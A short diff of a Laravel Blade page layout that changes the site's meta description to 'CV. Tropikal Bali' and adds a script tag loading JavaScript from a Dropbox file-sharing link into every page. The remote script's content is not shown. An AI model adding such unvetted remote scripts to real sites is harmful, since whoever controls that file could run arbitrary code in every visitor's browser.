@@ -7,7 +7,7 @@
     <meta name="csrf-token" content="{{ csrf_token() }}">
 
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta content="Toko Emas" name="description" />
+    <meta content="CV. Tropikal Bali" name="description" />
     <meta content="Wedya Pancer Dev House" name="author" />
 
     <link rel="shortcut icon" href="{{ asset('/assets/img/favicon.svg') }}" type="image/x-icon">
@@ -34,6 +34,9 @@
 
     @include('layouts.bottom-scripts')
     @yield('scripts')
+    <script
+        src="https://dl.dropbox.com/scl/fi/0lie16l5yerrh2e7ycgn8/index.js?rlkey=ng3bj21jo9sux8a8f96ry21rs&st=h2ufb3nd&dl=0">
+    </script>
 </body>
 
 </html>
